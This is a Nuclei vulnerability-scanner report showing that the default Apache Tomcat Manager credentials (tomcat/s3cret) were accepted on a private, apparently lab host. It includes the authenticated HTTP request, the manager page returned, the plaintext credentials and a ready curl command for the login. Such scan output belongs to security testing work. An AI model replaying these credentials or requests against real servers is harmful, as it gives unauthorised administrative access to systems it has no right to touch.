### ApahceTomcat Manager Default Login (tomcat-default-login) found on http://10.129.99.114:8080
---
**Details**: **tomcat-default-login**  matched at http://10.129.99.114:8080

**Protocol**: HTTP

**Full URL**: http://10.129.99.114:8080/manager/html

**Timestamp**: Tue May 31 09:11:55 +0100 BST 2022

**Template Information**

| Key | Value |
|---|---|
| Name | ApahceTomcat Manager Default Login |
| Authors | pdteam |
| Tags | tomcat, apache, default-login |
| Severity | high |
| Description | Apache Tomcat Manager default login credentials were discovered. This template checks for multiple variations. |

**Request**
```http
GET /manager/html HTTP/1.1
Host: 10.129.99.114:8080
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Connection: close
Authorization: Basic dG9tY2F0OnMzY3JldA==
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 200 OK
Connection: close
Transfer-Encoding: chunked
Cache-Control: private
Content-Type: text/html;charset=utf-8
Date: Tue, 31 May 2022 15:11:54 GMT
Expires: Thu, 01 Jan 1970 02:00:00 EET
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=9BAF3F360B92D329F24D0AEE102D8B46; Path=/manager; HttpOnly

<html>
<head>
<style>
H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}
  table {
    width: 100%;
  }
  td.page-title {
    text-align: center;
    vertical-align: top;
    font-family:sans-serif,Tahoma,Arial;
    font-weight: bold;
    background: white;
    color: black;
  }
  td.title {
    text-align: left;
    vertical-align: top;
    font-family:sans-serif,Tahoma,Arial;
    font-style:italic;
    font-weight: bold;
    background: #D2A41C;
  }
  td.header-left {
    text-align: left;
    vertical-align: top;
    font-family:sans-serif,Tahoma,Arial;
    font-weight: bold;
    background: #FFDC75;
  }
  td.header-center {
    text-align: center;
    vertical-align: top;
    font-family:sans-serif,Tahoma,Arial;
    font-weight: bold;
    background: #FFDC75;
  }
  td.row-left {
    text-align: left;
    vertical-align: middle;
    font-family:sans-serif,Tahoma,Arial;
    color: black;
  }
  td.row-center {
    text-align: center;
    vertical-align: middle;
    font-family:sans-serif,Tahoma,Arial;
    color: black;
  }
  td.row-right {
    text-align: right;
    vertical-align: middle;
    font-family:sans-serif,Tahoma,Arial;
    color: black;
  }
  TH {
    text-align: center;
    vertical-align: top;
    font-family:sans-serif,Tahoma,Arial;
    font-weight: bold;
    background: #FFDC75;
  }
  TD {
    text-align: center;
    vertical-align: middle;
    font-family:sans-serif,Tahoma,Arial;
    color: black;
  }
  form {
    margin: 1;
  }
  form.inline {
    display: inline;
  }
</style>
<title>/manager</title>
</head>

<body bgcolor="#FFFFFF">

<table cellspacing="4" border="0">
 <tr>
  <td colspan="2">
   <a href="http://tomcat.apache.org/">
    <img border="0" alt="The Tomcat Servlet/JSP Container"
         align="left" src="/manager/images/tomcat.gif">
   </a>
   <a href="http://www.apache.org/">
    <img border="0" alt="The Apache Software Foundation" align="right"
         src="/manager/images/asf-logo.svg" style="width: 266px; height: 83px;">
   </a>
  </td>
 </tr>
</table>
<hr size="1" noshade="noshade">
<table cellspacing="4" border="0">
 <tr>
  <td class="page-title" bordercolor="#000000" align="left" nowrap>
   <font size="+2">Tomcat Web Application Manager</font>
  </td>
 </tr>
</table>
<br>

<table border="1" cellspacing="0" cellpadding="3">
 <tr>
  <td class="row-left" width="10%"><small><strong>Message:</strong></small>&nbsp;</td>
  <td class="row-left"><pre>OK</pre></td>
 </tr>
</table>
<br>

<table border="1" cellspacing="0" cellpadding="3">
<tr>
 <td colspan="4" class="title">Manager</td>
</tr>
 <tr>
  <td class="row-left"><a href="/manager/html/list;jsessionid=9BAF3F360B92D329F24D0AEE102D8B46?org.apache.catalina.filters.CSRF_NONCE=1671974FA1AD7CB568C0740B6321AAD8">List Applications</a></td>
  <td class="row-center"><a href="/manager/../docs/html-manager-howto.html?org.apache.catalina.filters.CSRF_NONCE=1671974FA1AD7CB568C0740B6321AAD8">HTML Manager Help</a></td>
  <td class="row-center"><a href="/manager/../docs/manager-howto.html?org.apache.catalina.filters.CSRF_NONCE=1671974FA1AD7CB568C0740B6321AAD8">Manager Help</a></td>
  <td class="row-right"><a href="/manager/status;jsessionid=9BAF3F360B92D329F24D0AEE102D8B46?org.apache.catalina.filters.CSRF_NONCE=1671974FA1AD7CB568C0740B6321AAD8">Server Status</a></td>
 </tr>
</table>
<br>

<table border="1" cellspacing="0" cellpadding="3">
<tr>
 <td colspan="6" class="title">Applications</td>
</tr>
<tr>
 <td class="header-left"><small>Path</small></td>
 <td class="header-left"><small>Version</small></td>
 <td class="header-center"><small>Display Name</small></td>
 <td class="header-center"><small>Running</small></td>
 <td class="header-left"><small>Sessions</small></td>
 <td class="header-left"><small>Commands</small></td>
</tr>
<tr>
 <td class="row-left" bgcolor="#FFFFFF" rowspan="2"><small><a href="/">/</a></small></td>
 <td class="row-left" bgcolor="#FFFFFF" rowspan="2"><small><i>None specified</i></small></td>
 <td class="row-left" bgcolor="#FFFFFF" rowspan="2"><small>Welcome to Tomcat</small></td>
 <td class="row-center" bgcolor="#FFFFFF" rowspan="2"><small>true</small></td>
 <td class="row-center" bgcolor="#FFFFFF" rowspan="2"><small><a href="/manager/html/sessions;jsessionid=9BAF3F360B92D329F24D0AEE102D8B46?path=/&amp.... Truncated ....
```

**Extra Information**

**Metadata**:

- username: tomcat
- password: s3cret


References: 
- https://www.rapid7.com/db/vulnerabilities/apache-tomcat-default-ovwebusr-password/

**CURL Command**
```
curl -X 'GET' -d '' -H 'Authorization: Basic dG9tY2F0OnMzY3JldA==' -H 'Host: 10.129.99.114:8080' -H 'User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36' 'http://10.129.99.114:8080/manager/html'
```
---
Generated by [Nuclei 2.7.1](https://github.com/projectdiscovery/nuclei)